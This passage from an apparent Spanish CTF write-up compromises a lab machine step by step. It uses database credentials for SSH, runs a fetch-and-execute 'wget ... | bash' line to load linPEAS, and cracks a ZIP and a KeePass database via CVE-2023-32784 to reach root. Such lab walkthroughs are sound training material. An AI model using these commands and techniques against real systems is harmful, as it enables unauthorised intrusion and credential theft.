MariaDB [(none)]> use confidencial;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [confidencial]> show tables;
+------------------------+

| Tables_in_confidencial |
+------------------------+

| usuarios               |
+------------------------+
1 row in set (0.003 sec)
```
Solo hay una tabla que se llama **usuarios**.

Veamos su contenido:
```bash
MariaDB [confidencial]> select * from usuarios;
+-----------+------------------+

| usuario   | contraseña       |
+-----------+------------------+

| mortadela | Jua******* |
+-----------+------------------+
1 row in set (0.005 sec)
```
Parece que es la contraseña del **usuario mortadela**.

Al no poder usar el login que encontramos de **WordPress**, podemos probar estas credenciales con el **servicio SSH**.

Probemos:
```bash
ssh mortadela@192.168.1.60
mortadela@192.168.1.60's password: 
Linux mortadela 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan 30 02:02:06 2025 from X.X.X.X
mortadela@mortadela:~$ whoami
mortadela
```
Muy bien, estamos dentro.

Podemos obtener la primera flag:
```bash
mortadela@mortadela:~$ ls
user.txt
mortadela@mortadela:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Enumeración de Máquina Víctima y Crackeo de Archivo Zip {#CrackZip}

Veamos qué privilegios tenemos:
```bash
mortadela@mortadela:~$ sudo -l
[sudo] contraseña para mortadela: 

Lo siento, pruebe otra vez.
[sudo] contraseña para mortadela: 
Lo siento, pruebe otra vez.
[sudo] contraseña para mortadela: 
Sorry, user mortadela may not run sudo on mortadela.
```
Ninguno.

Busquemos si existe un **binario SUID** del que nos podamos aprovechar:
```bash
mortadela@mortadela:~$ find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
No veo alguno que nos pueda ayudar.

Entonces, vamos a usar **linPEAS** para ver si encuentra algo dentro de la máquina de lo que nos podamos aprovechar.

Puedes descargarlo de aquí:
* <a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20250126-41ed0f6a" target="_blank">Repositorio de peass-ng: PEASS-ng - Releases</a>

Esta vez, vamos a ejecutar el **linPEAS** desde el servidor que alcemos en nuestra máquina.

Tan solo necesitamos levantar un servidor con **Python** y como en la máquina víctima tenemos **wget**, lo ejecutamos en conjunto con **Bash**:
```bash
mortadela@mortadela:/tmp$ wget -qO- http://Tu_IP/linpeas.sh | bash
.
                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
.
    /---------------------------------------------------------------------------------\

    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.wiki         |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop
...
...
...
```

Revisando lo que fue encontrando **linPEAS**, encontramos un archivo ZIP dentro del directorio `/opt`:
```bash
╔══════════╣ Unexpected in /opt (usually empty)
total 90880
drwxr-xr-x  2 root root     4096 abr  1  2024 .
drwxr-xr-x 18 root root     4096 abr  1  2024 ..
-rw-r--r--  1 root root 93052465 abr  1  2024 muyconfidencial.zip
```

Vamos a descargarlo en nuestra máquina.

Lo descargaremos desde el **servicio SSH** con la herramienta **scp**:
```bash
scp mortadela@192.168.1.60:/opt/muyconfidencial.zip .
mortadela@192.168.1.60's password: 
muyconfidencial.zip
```

Descomprimamos ese archivo ZIP:
```bash
unzip muyconfidencial.zip
Archive:  muyconfidencial.zip
[muyconfidencial.zip] Database.kdbx password: 
   skipping: Database.kdbx           incorrect password
   skipping: KeePass.DMP             incorrect password
```
Nos pide una contraseña que no tenemos y la del **usuario mortadela** no funciona. Además, podemos ver extensiones de archivos que pertenecen a **KeePass**.

Podemos intentar crackear su contraseña, convirtiendo el archivo ZIP en un hash que pueda utilizar **JohnTheRipper** con la herramienta **zip2john**:
```bash
zip2john muyconfidencial.zip > hashZip
ver 1.0 efh 5455 efh 7875 muyconfidencial.zip/Database.kdbx PKZIP Encr: 2b chk, TS_chk, cmplen=2170, decmplen=2158, crc=DF3016BC ts=9D09 cs=9d09 type=0
ver 2.0 efh 5455 efh 7875 muyconfidencial.zip/KeePass.DMP PKZIP Encr: TS_chk, cmplen=93049937, decmplen=267519983, crc=52EC3DC7 ts=9D79 cs=9d79 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Y ya con **JohnTheRipper**, la crackeamos:
```bash
john -w:/usr/share/wordlists/rockyou.txt hashZip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pinkgirl         (muyconfidencial.zip)     
1g 0:00:00:00 DONE (2025-01-30 14:06) 33.33g/s 341333p/s 341333c/s 341333C/s 123456..1asshole
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
No tardo ni un segundo.

Ahora sí, descomprimimos ese archivo:
```bash
unzip muyconfidencial.zip
Archive:  muyconfidencial.zip
[muyconfidencial.zip] Database.kdbx password: 
 extracting: Database.kdbx           
  inflating: KeePass.DMP
```
Ya tenemos los archivos descomprimidos.

### Aplicando Volcado de Memoria a KeePass y Obteniendo Contraseña de Root {#CrackKeep}

Primero, vamos a entender que es **KeePass** y esas extensiones.

| **Gestor de Contraseñas KeePass** |
|:-----------:|
| *KeePass es un gestor de contraseñas de código abierto que permite almacenar credenciales de forma segura en una base de datos cifrada. Se utiliza para gestionar múltiples contraseñas con una única contraseña maestra o con una clave de archivo.* |

| **Archivos kdbx** |
|:-----------:|
| *Un archivo .kdbx es una base de datos cifrada utilizada por KeePass, un administrador de contraseñas de código abierto. Estos archivos almacenan credenciales de acceso (usuarios y contraseñas) de forma segura, protegiéndolos con un algoritmo de cifrado fuerte.* |

| **Archivos DMP** |
|:-----------:|
| *Un archivo .DMP es un archivo de volcado de memoria (dump file) que almacena información sobre el estado de un programa o del sistema operativo en el momento de un fallo o error. Se usa principalmente para diagnosticar y depurar problemas en software y sistemas operativos.* |

Queda claro que nos enfrentamos contra **KeePass**.

Investigando un poco, podemos encontrar información sobre una vulnerabilidad que permite aplicar un **volcado de memoria** al **archivo DMP**, para obtener la contraseña maestra de la BD que almacena las contraseñas.

Aquí te dejo el blog que explica esta vulnerabilidad:
* <a href="https://www.cyberis.com/article/exploiting-keepass-cve-2023-32784" target="_blank">Exploiting KeePass CVE-2023-32784</a>

Antes de continuar, veamos que es un **volcado de memoria**:

| **Volcado de Memoria** |
|:-----------:|
| *Un volcado de memoria (memory dump) es una copia del contenido de la memoria RAM de un sistema en un momento específico. Se utiliza para análisis forense, depuración de errores y recuperación de información.* |

En blog ya nos dan un repositorio que contiene un Exploit que se aprovecha de esta vulnerabilidad. 

**OJO: debes tener instalado .NET versión 7, ya sea en tu máquina Kali o en una máquina Windows.**

En mi caso, voy a aplicar el **volcado de memoria** en mi máquina Kali.

Una vez que tengas descargado el repo y que cumplas con los requisitos de uso, lo ejecutamos:
```batch
dotnet run --project keepass-password-dumper/keepass_password_dumper.csproj muyconfidencial/KeePass.DMP
.
Esto es .NET 9.0.
---------------------
Versión del SDK: 9.0.102
----------------
...
...
...
...
Found: ● 
Found: ●f
.
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:	●
2.:	*, Ï, §, ñ, D, , \, #, y, k, 9, ;, H, [,  , f, 
3.:	*, 
4.:	*, 
5.:	*, 
6.:	*, 
7.:	*, 
8.:	*, 
9.:	*, 
10.:	*, 
11.:	*, 
12.:	*, 
13.:	*, 
14.:	*, 
Combined: ●{a, Ï, §, ñ, D, , \, #, y, k, 9, ;, H, [,  , f}********
```
Funciono bien, pero parece que falto por obtener el primer carácter de la contraseña.

Tan solo nos falta obtener ese carácter.

Gracias a nuestra biblia **HackTricks**, nos enseña a aplicar fuerza bruta a **KeePass**:
* <a href="https://book.hacktricks.wiki/en/generic-hacking/brute-force.html?highlight=keepass#keepass" target="_blank">HackTricks: Brute Force - CheatSheet - KeePass</a>

Ahora, debemos crear un diccionario que tenga variaciones de la contraseña incompleta, para poder usar **JohnTheRipper** y poder encontrar la contraseña completa.

Primero, vamos a crear el diccionario y esto lo haremos con la herramienta **crunch**.

Debemos indicarle un mínimo y un máximo de caracteres (la contraseña es de 14 caracteres), luego los caracteres que serán usados (podemos usar minúsculas, mayúsculas y números), le podemos indicar una palabra que puede ser usada para crear las variaciones en conjunto con los caracteres seleccionados (usamos la contraseña incompleta) y le decimos que guarde los resultados en un archivo de texto:
```batch
crunch 14 14 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t @********** -o diccionario.txt
Crunch will now generate the following amount of data: 930 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 62 
crunch: 100% completed generating output
```
Ya tenemos nuestro diccionario.

Con la herramienta **keepass2john**, podemos generar un hash del **archivo kdbx** para poder usarlo con **JohnTheRipper**:
```bash
keepass2john Database.kdbx > hashKeeP
```

Por último, usamos **JohnTheRipper** con nuestro diccionario y veamos si obtenemos la contraseña completa:
```bash
john -w:../diccionario.txt hashKeeP
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********   (Database)     
1g 0:00:00:00 DONE (2025-01-31 01:31) 3.846g/s 153.8p/s 153.8c/s 153.8C/s uaritrini12345..Naritrini12345
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Súper, ya tenemos la contraseña.

Vamos a comprobar si es correcta, abriendo el archivo con **KeePass**. Yo lo haré desde una máquina Windows:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura13.png">
</p>

Perfecto, es correcta y podemos ver una contraseña que parece ser del **usuario Root**:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura14.png">
</p>

Ya solo comprobemos si nos podemos autenticar como **Root**:
```bash
ssh root@192.168.1.60
root@192.168.1.60's password: 
Linux mortadela 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Apr  2 19:05:52 2024 from X.X.X.X
root@mortadela:~# whoami
root
```

Obtenemos la última flag:
```bash
root@mortadela:~# ls
root.txt
root@mortadela:~# cat root.txt
...
```
Y con esto terminamos la máquina.
